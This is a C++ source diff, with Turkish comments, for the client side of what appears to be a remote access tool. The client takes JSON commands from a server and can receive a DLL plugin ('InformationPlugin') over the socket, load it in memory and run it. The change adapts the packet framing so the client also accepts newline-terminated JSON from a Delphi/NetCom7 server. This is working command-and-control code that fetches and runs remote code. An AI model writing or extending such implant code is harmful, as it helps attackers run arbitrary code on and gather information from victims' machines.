@@ -31,17 +31,10 @@ private:
     PluginManager pluginMgr;
     bool connected = false;
 
-    // Veri gönderme: JSON verisini binary paket içinde gönderir (Type 0x01)
+    // Veri gönderme: Delphi/NetCom7 için sonuna \r\n ekler (Mevcut yapıya dönüş)
     void send_data(json data) {
         if (!connected) return;
-        string msg = data.dump();
-
-        PacketHeader header;
-        header.signature = 0x524E; // 'NR'
-        header.type = 0x01;
-        header.size = (uint32_t)msg.length();
-
-        send(sock, (const char*)&header, sizeof(header), 0);
+        string msg = data.dump() + "\r\n";
         send(sock, msg.c_str(), (int)msg.length(), 0);
     }
 
@@ -54,10 +47,8 @@ private:
                 if (pluginMgr.isPluginLoaded("InformationPlugin")) {
                     pluginMgr.executePlugin("InformationPlugin", "RunPlugin", sock);
                 } else {
-                    // Plugin yoksa sunucudan iste
                     cout << "[*] InformationPlugin bulunamadi, sunucudan isteniyor..." << endl;
-                    json req = {{"action", "request_plugin"}, {"id", "InformationPlugin"}};
-                    send_data(req);
+                    send_data({{"action", "request_plugin"}, {"id", "InformationPlugin"}});
                 }
             }
             else if (action == "message" || action == "messagebox") {
@@ -83,36 +74,43 @@ private:
 
             recv_buffer.insert(recv_buffer.end(), chunk, chunk + bytesRead);
 
-            while (recv_buffer.size() >= sizeof(PacketHeader)) {
-                PacketHeader* header = (PacketHeader*)recv_buffer.data();
+            // Gelen mesaj hem binary paket hem de düz \r\n JSON olabilir.
+            // Delphi tarafı bazen düz gönderiyorsa diye kontrol ediyoruz.
 
-                if (header->signature != 0x524E) {
-                    recv_buffer.erase(recv_buffer.begin());
-                    continue;
-                }
+            while (!recv_buffer.empty()) {
+                // 1. Binary Paket Kontrolü
+                if (recv_buffer.size() >= sizeof(PacketHeader)) {
+                    PacketHeader* header = (PacketHeader*)recv_buffer.data();
+                    if (header->signature == 0x524E) {
+                        if (recv_buffer.size() < sizeof(PacketHeader) + header->size) break;
 
-                if (recv_buffer.size() < sizeof(PacketHeader) + header->size) {
-                    break;
-                }
-
-                uint8_t* payload = recv_buffer.data() + sizeof(PacketHeader);
-                vector<uint8_t> payload_data(payload, payload + header->size);
-
-                if (header->type == 0x01) { // JSON
-                    string json_str((char*)payload_data.data(), payload_data.size());
-                    process_json_command(json_str);
-                }
-                else if (header->type == 0x02) { // DLL
-                    cout << "[+] Sunucudan DLL paketi alindi, bellege yukleniyor..." << endl;
-                    if (pluginMgr.loadPluginFromMemory("InformationPlugin", payload_data)) {
-                        cout << "[+] Plugin basariyla yuklendi ve calistiriliyor." << endl;
-                        pluginMgr.executePlugin("InformationPlugin", "RunPlugin", sock);
-                    } else {
-                        cout << "[-] Plugin yukleme hatasi!" << endl;
+                        uint8_t* payload = recv_buffer.data() + sizeof(PacketHeader);
+                        if (header->type == 0x01) {
+                            process_json_command(string((char*)payload, header->size));
+                        } else if (header->type == 0x02) {
+                            cout << "[+] Sunucudan DLL alindi." << endl;
+                            vector<uint8_t> dll_data(payload, payload + header->size);
+                            if (pluginMgr.loadPluginFromMemory("InformationPlugin", dll_data)) {
+                                pluginMgr.executePlugin("InformationPlugin", "RunPlugin", sock);
+                            }
+                        }
+                        recv_buffer.erase(recv_buffer.begin(), recv_buffer.begin() + sizeof(PacketHeader) + header->size);
+                        continue;
                     }
                 }
 
-                recv_buffer.erase(recv_buffer.begin(), recv_buffer.begin() + sizeof(PacketHeader) + header->size);
+                // 2. Düz JSON (\r\n) Kontrolü (Geriye uyumluluk için)
+                string current_buf((char*)recv_buffer.data(), recv_buffer.size());
+                size_t pos = current_buf.find("\r\n");
+                if (pos != string::npos) {
+                    process_json_command(current_buf.substr(0, pos));
+                    recv_buffer.erase(recv_buffer.begin(), recv_buffer.begin() + pos + 2);
+                    continue;
+                }
+
+                // Senkronizasyon kaybolmuşsa veya paket yarım kalmışsa
+                if (recv_buffer.size() > 1024 * 1024) recv_buffer.clear(); // Emniyet
+                break;
             }
         }
         connected = false;
